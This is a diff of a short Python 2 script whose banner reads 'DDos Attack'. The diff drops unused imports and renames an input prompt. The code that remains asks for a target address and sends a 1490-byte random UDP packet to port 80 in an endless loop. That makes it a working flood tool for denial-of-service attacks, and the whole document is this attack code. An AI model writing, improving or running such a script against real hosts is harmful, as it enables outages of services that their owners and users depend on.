@@ -1,16 +1,12 @@
 import sys
 import os
-import time
 import socket
 import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
-ip = raw_input("IP Target : ")
+ip = raw_input("Target : ")
 sent = 1
 while True:
      sock.sendto(bytes, (ip,80))
